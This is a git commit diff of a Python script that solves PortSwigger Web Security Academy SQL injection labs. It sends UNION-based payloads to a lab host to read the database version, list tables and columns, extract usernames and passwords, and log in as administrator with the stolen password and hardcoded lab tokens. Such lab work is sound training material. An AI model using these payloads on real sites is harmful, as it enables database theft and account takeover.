bcb4c3082c849d3679de6027d0ef45f88c905a68
Bradley Neumaier <neumaierbradley@gmail.com>
2020-05-16 20:11:51 -0400

    Solve listing database contents non oracle lab

--- sqli/examining-the-database.py
+++ sqli/examining-the-database.py
@@ -1,16 +1,18 @@
 # https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
+# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
+# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
 
 import requests
 requests.packages.urllib3.disable_warnings()
 
-base = "https://ac881fb71fc6397c80e8176600eb002b.web-security-academy.net"
+base = "https://acc51f001facc69a80aa125200f200aa.web-security-academy.net"
 path = "/filter"
 url = base + path
 
 proxy = "127.0.0.1:8080"
 proxies = {"https": proxy, "http": proxy}
 verify = False
-cookies = {"session": "RvC1zXxKDY9yelddAAqF0oH4m9i8XJu2"}
+cookies = {"session": "PgmhyoW7ObaehMh7w6zh9HpZZOLUxQCG"}
 
 def findNumberOfColumns():
     for i in range(1,11):
@@ -23,5 +25,45 @@ def queryingDatabaseVersionOracle():
     params = {"category": q}
     requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)
 
+def queryingDatabaseVersionMysqlMicrosoft():
+    q = f"' UNION SELECT @@version, NULL-- "
+    params = {"category": q}
+    requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)
+
+def login():
+    username = "administrator"
+    csrf = "CsyYEYVDp3hcOqVxMWheXvwayPoYpa0U"
+    password = "e63lyfhsxoyeakv1fytd"
+    data = {"csrf": csrf, "username": username, "password": password}
+    route = "/login"
+    requests.post(url=base + route, data=data, cookies=cookies, proxies=proxies, verify=verify)
+
+def listingDatabaseContentsNonOracle():
+    def listAllTableNames():
+        q = f"' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables-- "
+        params = {"category": q}
+        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)
+
+    def listAllColumnNames():
+        table = "users_jxoazw"
+        q = f"' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = '{table}'-- "
+        params = {"category": q}
+        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)
+
+    def retrieveUserNameAndPassword():
+        table = "users_jxoazw"
+        col1 = "username_aftmdt"
+        col2 = "password_scjpvq"
+        q = f"' UNION SELECT {col1}, {col2} FROM {table}-- "
+        params = {"category": q}
+        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)
+
+    # listAllTableNames()
+    # listAllColumnNames()
+    retrieveUserNameAndPassword()
+
 # findNumberOfColumns()
-queryingDatabaseVersionOracle()
+# queryingDatabaseVersionOracle()
+# queryingDatabaseVersionMysqlMicrosoft()
+# listingDatabaseContentsNonOracle()
+login()
